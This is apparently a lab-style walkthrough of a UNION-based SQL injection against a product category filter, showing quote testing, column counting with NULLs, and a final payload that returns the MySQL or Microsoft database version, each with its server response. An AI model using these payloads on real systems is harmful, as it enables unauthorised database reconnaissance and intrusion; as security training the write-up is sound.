# SQL injection, querying the database type and version on MySQL and Microsoft

### Goal:
`Display the database version`

### Info: The injection point is the product category filter
`target.com/filter?category=<input>`
### Info: The target is using a MySQL or Microsoft database
<br><br>

**<ins>Step 1: Test injection point</ins>**

category='

`500: server error`

category='#

`200`
<br><br>

**<ins>Step 2: Enumerate data with UNION attack</ins>**<br><br>

We know that the database is either MySQL or Microsoft, which share similar syntax. We need to use this syntax for a successful attack.<br><br>

category=' UNION SELECT NULL#

`500 server error`<br><br>

category=' UNION SELECT NULL,NULL#

`200`

This means that the query outputs two values
<br><br>

category=' UNION SELECT 'a','b'#

`200`

This means that both values are strings. Knowing this, we can use either to output the desired data
<br><br>

**<ins>Step 3: Exploit the vulnerability</ins>**

category=' UNION SELECT @@version,NULL#

`Success!`

In a normal request, the database would output a product's name and description. This query prompts it to return the database version instead of a name, giving us valuable information for further probing.